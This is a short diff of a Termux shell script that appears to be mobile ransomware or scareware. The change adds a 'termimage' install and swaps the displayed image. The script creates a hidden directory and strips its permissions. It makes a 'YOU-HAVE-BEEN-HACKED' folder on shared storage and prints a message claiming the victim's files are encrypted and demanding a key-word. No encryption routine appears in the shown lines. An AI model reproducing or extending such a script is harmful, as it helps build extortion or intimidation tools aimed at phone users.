@@ -1,4 +1,5 @@
 pkg install zip
+pkg install termimage
 termux-setup-storage
 read -p "enter"
 mkdir /$HOME/.rfkzk
@@ -7,7 +8,7 @@ chmod u=w /$HOME/.rfkzk
 mkdir /sdcard/YOU-HAVE-BEEN-HACKED
 clear
 
-termimage 1705743575411.png
+termimage IMG-20240228-WA0000.jpg
 echo -e "\033[7;49;91m YOUR FILES ARE ENCRYPTED PLEASE ENTER THE KEY-WORD BELLOW!\033[m"
 echo ""
 sleep 1
